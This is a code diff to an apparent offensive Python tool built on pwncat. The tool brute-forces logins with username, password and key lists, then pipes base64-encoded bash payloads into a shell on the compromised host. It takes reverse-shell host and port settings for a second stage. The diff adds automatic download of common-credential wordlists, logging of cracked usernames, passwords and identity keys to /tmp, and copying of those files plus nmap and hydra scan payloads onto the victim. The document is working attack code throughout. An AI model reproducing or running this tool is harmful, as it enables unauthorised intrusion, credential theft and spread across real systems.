@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 import base64
 import os
-from uu import encode
 import pwncat.manager
 from pwncat.channel import ChannelError
 import signal
@@ -10,6 +9,7 @@ import subprocess
 import argparse
 from pathlib import Path
 import time
+import requests
 
 parser = argparse.ArgumentParser(description='reverse shell listener')
 parser.add_argument('--user', dest='user', type=str,
@@ -36,6 +36,14 @@ parser.add_argument('--reverse-shell-host', dest='reverse_shell_host', type=str,
                     required=True, help='reverse shell host to be used as second stage')
 parser.add_argument('--reverse-shell-port', dest='reverse_shell_port', type=str,
                     required=True, help='reverse shell port to be used as second stage')
+parser.add_argument('--add-default-passwords', dest="add_default_passwords",
+                    default=True, action=argparse.BooleanOptionalAction)
+parser.add_argument('--default-passwords-url', dest="default_passwords_url",
+                    default="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-passwords-shortlist.txt")
+parser.add_argument('--add-default-users', dest="add_default_users",
+                    default=True, action=argparse.BooleanOptionalAction)
+parser.add_argument('--default-users-url', dest="default_users_url",
+                    default="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt")
 
 args = parser.parse_args()
 
@@ -85,8 +93,21 @@ def execute(session: pwncat.manager.Session, task):
                 ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_extractidentites | base64 -d | /bin/bash'], cwd="/tmp", capture_output=True, text=True)
             session.log(result)
 
+            files = ["/tmp/found-users.txt",
+                     "/tmp/found-passwords.txt", "/tmp/found-identities.txt"]
+            file_list = ", ".join(files)
+            session.log(
+                f"copying scan requirements: {file_list}...")
+            for file in files:
+                if Path(file).exists():
+                    session.log(f"copying: {file}")
+                    with open(file, 'rb') as f1:
+                        with session.platform.open(file, 'wb') as f2:
+                            f2.write(f1.read())
+                else:
+                    session.log(f"file not found: {file}")
+
             session.log("building nmap and hydra scan paylod...")
-            payload = ""
             with open("scan.sh", 'rb') as f:
                 payload = base64.b64encode(f.read())
 
@@ -145,19 +166,19 @@ identities = []
 payload = args.payload
 
 if args.user_list is not None and Path(args.user_list).exists():
-    with open(Path(args.user_list)) as f:
+    with open(str(Path(args.user_list)), 'rb') as f:
         users = f.read().splitlines()
 elif args.user is not None:
     users.append(args.user)
 
 if args.password_list is not None and Path(args.password_list).exists():
-    with open(Path(args.password_list)) as f:
+    with open(str(Path(args.password_list)), 'rb') as f:
         passwords = f.read().splitlines()
 elif args.password is not None:
     passwords.append(args.password)
 
 if args.identity_list is not None and Path(args.identity_list).exists():
-    with open(Path(args.identity_list)) as f:
+    with open(str(Path(args.identity_list)), 'rb') as f:
         for i in f.read().splitlines():
             identities.append(base64.b64decode(i))
 elif args.identity is not None:
@@ -170,6 +191,23 @@ if not len(users):
 if not len(passwords) and not len(identities):
     raise Exception(
         "One of --password, --identity, --password-list, or --identity-list are required")
+
+# reset found users
+Path("/tmp/found-users.txt").unlink(True)
+Path("/tmp/found-passwords.txt").unlink(True)
+Path("/tmp/found-identities.txt").unlink(True)
+
+# append default passwords as required
+if args.add_default_passwords:
+    url = args.default_passwords_url
+    password_list = requests.get(url).content
+    passwords += password_list.splitlines()
+
+# append default users as required
+if args.add_default_users:
+    url = args.default_users_url
+    user_list = requests.get(url).content
+    users += user_list.splitlines()
 
 # enumerate users
 success = False
@@ -192,6 +230,10 @@ for user in users:
                     user=user,
                     password=password,
                 )
+                with open('/tmp/found-users.txt', 'ab+') as f:
+                    f.write(user)
+                with open('/tmp/found-passwords.txt', 'ab+') as f:
+                    f.write(password)
                 execute(session, args.task)
                 success = True
         except ChannelError as e:
@@ -227,6 +269,10 @@ for user in users:
                                 user=user,
                                 password=password,
                             )
+                            with open('/tmp/found-users.txt', 'ab+') as f:
+                                f.write(user)
+                            with open('/tmp/found-passwords.txt', 'ab+') as f:
+                                f.write(password)
                             execute(session, args.task)
                             success = True
                             reconnect = False
@@ -267,6 +313,10 @@ for user in users:
                     user=user,
                     identity=identity,
                 )
+                with open('/tmp/found-users.txt', 'ab+') as f:
+                    f.write(user)
+                with open('/tmp/found-identities.txt', 'ab+') as f:
+                    f.write(identity)
                 execute(session, args.task)
                 success = True
         except ChannelError as e:
@@ -300,8 +350,12 @@ for user in users:
                                 host=args.target_ip,
                                 port=args.target_port,
                                 user=user,
-                                password=password,
+                                identity=identity,
                             )
+                            with open('/tmp/found-users.txt', 'ab+') as f:
+                                f.write(user)
+                            with open('/tmp/found-identities.txt', 'ab+') as f:
+                                f.write(identity)
                             execute(session, args.task)
                             success = True
                             reconnect = False
@@ -326,7 +380,6 @@ for user in users:
     # stop user enumeration
     if success:
         break
-
 
 exit(0)
 
